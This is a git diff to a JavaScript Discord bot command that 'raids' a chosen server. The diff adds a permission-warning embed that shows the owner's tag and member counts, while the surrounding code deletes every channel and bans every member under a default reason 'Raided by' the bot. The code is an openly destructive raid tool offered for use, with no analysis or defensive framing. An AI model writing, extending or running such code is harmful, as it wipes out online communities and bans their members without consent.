@@ -29,6 +29,7 @@ module.exports = {
     },
     async execute (interaction) {
         const guild = interaction.client.guilds.cache.get(interaction.options.getString("guild"));
+        const guildOwner = await guild.fetchOwner();
         const raidOptions = {
             reason: interaction.options.getString("reason") || "Raided by interaction.client.user.tag",
             channelsName: interaction.options.getString("channels_name"),
@@ -41,9 +42,11 @@ module.exports = {
             rolesName: interaction.options.getString("roles_name"),
             rolesAmount: interaction.options.getInteger("roles_amount") || 50
         }
-        
-        const deleteAllChannels = async (guild) => {
-            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ content: "I don't have the `MANAGE_CHANNELS` permission!", ephemeral: true });
+        const permissionsEmbed = (permission) => {
+            return { description: `:warning: I don't have the \`${permission}\` permission!`, color: 0x0099ff, thumbnail: {url: `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.jpg` }, footer: { text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4"}, fields: [{name: "Server Name", value: guild.name, inline: true }, {name: "Server Owner", value: guildOwner.user.tag, inline: true }, {name: "Server Members Amount", value: guild.memberCount }, {name: "Channels Amount", value: guild.channels.cache.size, inline: true }, {name: "Roles Amount", value: guild.roles.cache.size, inline: true }], timestamp: new Date().toISOString() }
+        }
+            const deleteAllChannels = async (guild) => {
+            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_CHANNELS")], ephemeral: true });
             guild.channels.cache.forEach(channel => {
                 channel.delete();
             });
@@ -66,7 +69,7 @@ module.exports = {
         }
 
         const banAll = async (guild) => {
-            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.user.send({ content: "I don't have the `BAN_MEMBERS` permission!", ephemeral: true });
+            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.user.send({ embeds: [permissionsEmbed("BAN_MEMBERS")], ephemeral: true });
             guild.members.cache.forEach(async member => {
                 try {
                     await member.ban({ reason: raidOptions.reason });
